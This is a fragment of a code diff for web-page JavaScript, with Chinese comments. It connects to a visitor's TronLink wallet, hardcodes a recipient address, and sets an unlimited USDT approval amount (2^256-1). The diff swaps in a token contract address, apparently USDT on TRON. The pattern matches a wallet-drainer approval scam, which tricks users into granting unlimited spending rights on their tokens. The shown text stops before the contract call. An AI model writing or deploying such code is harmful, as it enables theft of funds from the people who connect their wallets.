@@ -180,9 +180,9 @@
         await window.tronLink.request({ method: 'tron_requestAccounts' });
         const fromAddress = window.tronWeb.defaultAddress.base58;
 
-        const transferContract = 'TTikvL6oACpebWFU3j8bUabJx5kgEUYgGQ'; // 合约地址，转换为十六进制
+        const transferContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 合约地址，转换为十六进制
         const usdtrecipient = 'TRg9o55JzYhJjeRo1gTHqttNwHcAzfWEoi'; // 接收地址，转换为十六进制
-        const tokenContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz'; // USDT 合约地址
+        const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT 合约地址
         const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 2^256 - 1，表示无限授权; // 授权的 USDT 数量（单位是最小单位）
 
         // 使用 tronWeb 访问智能合约
